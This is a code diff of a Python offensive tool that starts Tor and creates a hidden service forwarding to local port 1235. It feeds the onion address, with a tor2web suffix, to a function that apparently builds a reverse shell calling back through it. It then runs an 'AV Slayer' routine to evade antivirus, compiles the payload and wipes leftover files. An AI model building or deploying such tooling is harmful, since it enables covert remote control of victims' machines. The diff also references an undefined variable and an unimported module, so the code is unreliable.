@@ -1,14 +1,18 @@
 import os
 import sys
 import time
-import subprocess
 import build
+import crypt
+import config
 import random
 import string
+import shutil
 import signal
 import hashlib
+import subprocess
+import stem.socket
+import stem.connection
 from stem.control import Controller
-import config
 from colorama import init, Fore, Style
 init(autoreset=True)
 bblue = Fore.BLUE + Style.BRIGHT
@@ -18,7 +22,6 @@ bos = "\033[1;37m"
 def requirements():
     if os.name == 'nt':
         if not os.path.isdir('C:\\Tor'):
-            #print(f'{bblue}[!]{bos} You need msfvenom for create reverse shell.\n{bblue}[!]{bos} If you only want create hidden service lets continue.')
             print(f"{bblue}[!]{bos} Tor expert bundle is downloading..")
             build.download_tor()
         else:
@@ -59,24 +62,22 @@ def connection():
                 resulhost = host + ".to"
                 build.shell(resulhost)
     else:
+        os.system("tor --quiet &")
+        time.sleep(8)
         with Controller.from_port() as controller:
             controller.authenticate()
-        print(f"{bblue}[*]{bos} Tor is running version %s" % controller.get_version())
-        hidden_service_dir = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service')
-        try:
-            print(f"{bblue}[*]{bos} Creating hidden service in %s" % hidden_service_dir)
-            result = controller.create_hidden_service(hidden_service_dir, 80, target_port=1235)
-        except:
-            print(f"{bblue}[*]{bos} Unable to connect retrying..")
-            main()
-        if result.hostname:
-            print(f"{bblue}[*]{bos} Service is available at %s redirecting to local port 1235" % result.hostname)
-            result.hostname = result.hostname + ".to"
-            build.shell(result.hostname)
+            print(f"{bblue}[*]{bos} Tor is running version {controller.get_version()}")
+            print(f"{bblue}[*]{bos} Creating hidden service in hidden_service folder..")
+            hidden_service = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service')
+            result = controller.create_hidden_service(path=hidden_service ,port=80, target_port=1235)
+            if result.hostname:
+                print(f"{bblue}[*]{bos} Service is available at {result.hostname}")
+                tor2web = result.hostname + ".to"
+                build.shell(tor2web)       
 
 def banner():
     z = """
-                            Version 1.0.0
+                            Version 1.0.1
         [+] █████████████████████████████████████████████████████ [+]
                         Coded by github.com/samet-g\n
 """
@@ -95,17 +96,18 @@ def banner():
    |   /               |_|     |  |   |  |\ \._,\ '/                             
    `'-'                        '--'   '--' `--'  `"                              
     {bos}""")
-    for c in z:
-        sys.stdout.write(f"{bblue}{c}")
-    sys.stdout.flush()
-    time.sleep(0.02)
-    
+
 def main():
     banner()
-    time.sleep(2)
     requirements()
-    time.sleep(3)
     connection()
+    crypt.slayer() # thanks for awesome AV Slayer! by mertdas and whoismept
+    crypt.compile()
+    shutil.rmtree(hidden_service)
+    print("Shutting down and clean junk files..")
+    os.kill(int(subprocess.check_output(["pidof", "tor"])), signal.SIGTERM)
+    os.system(f"rm -rf tornado.cpp template.cpp tornado.raw")
+    crypter.cya()
 
 if __name__ == "__main__":
     main()
